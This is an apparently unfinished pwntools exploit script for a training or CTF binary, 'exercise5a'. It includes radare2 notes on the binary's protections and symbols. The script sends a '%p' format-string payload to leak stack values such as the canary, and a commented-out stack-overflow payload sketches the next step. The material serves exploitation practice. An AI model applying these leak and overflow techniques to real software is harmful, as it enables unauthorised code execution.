#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise5/exercise5a'
exe = './exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x400000
binsz    15280
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''

'''
0x00401256 23 sym.uncallable
0x0040126d 68 sym.readLine
0x004012b1 256 sym.check_authorization
0x004013b1 400 main
0x004013b1 400 sym.main
0x00401550 101 sym.__libc_csu_init
'''
'''
0x00402008 9 str.cat_flag
0x00402018 40 str.Enter_the_secret_password_for_user__d:
0x00402040 20 str.is_not_the_password
0x00402054 15 str.Authorized__d
0x00402063 24 str.Unauthorized._Try_again
'''

i = 1;
canary = None

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Enter_the_secret_password_for_user 2:\n"

payload = b"%p %p %p %p %p %p %p"
r.sendline(payload)

print("Msg " + str(i) + ": ", end="")
i = i + 1
canary_line = r.recvline()
#(puts appends a newline)
print(canary_line) #"[address] 0x1 [address] 0x26 0x26 (nil) 0x4[canary]is not the password
print(type(canary_line))
# canary = canary_line[:-len(b'is not the password')][-4:]
# print("Canary: ", end="")
# print(canary)


# pre_canary = (0x100 - 0x10) * b'A'
# ret_value = b'\x42' * 4
# counter_value = b'\x42' * 8

# payload = pre_canary + canary + ret_value + counter_value


# print("Msg " + str(i) + "_" + str(attempt_id) + ": ", end="")
# i = i + 1
# print(r.recvall(timeout=5)) #flag